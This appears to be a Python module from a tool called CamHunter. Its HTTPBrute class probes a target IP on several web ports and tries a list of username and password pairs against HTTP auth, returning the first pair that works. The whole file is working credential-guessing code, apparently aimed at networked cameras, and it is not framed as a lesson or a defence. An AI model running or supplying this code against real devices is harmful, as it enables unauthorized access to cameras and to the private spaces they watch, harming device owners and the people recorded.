"""
HTTP Brute Force Module for CamHunter v2.0
"""

import requests
import logging
from typing import List, Optional

logger = logging.getLogger("camhunter.brute.http")

class HTTPBrute:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.timeout = cfg["brute"]["timeout"]
        self.delay = cfg["brute"]["delay_between_attempts"]

    def attack(self, ip: str, credentials: List[tuple]) -> Optional[dict]:
        """
        Attempts to login via HTTP Basic or Digest auth.
        """
        url = f"http://{ip}"
        # Test 80 and 8080 if not specified
        ports = [80, 8080, 81, 8443]
        
        for port in ports:
            target_url = f"http://{ip}:{port}"
            try:
                # First probe to see if alive
                r = requests.get(target_url, timeout=self.timeout)
                for user, pw in credentials:
                    try:
                        # Test Basic/Digest Auth
                        resp = requests.get(target_url, auth=(user, pw), timeout=self.timeout)
                        if resp.status_code == 200:
                            return {"username": user, "password": pw, "port": port}
                    except Exception:
                        continue
            except Exception:
                continue
        return None
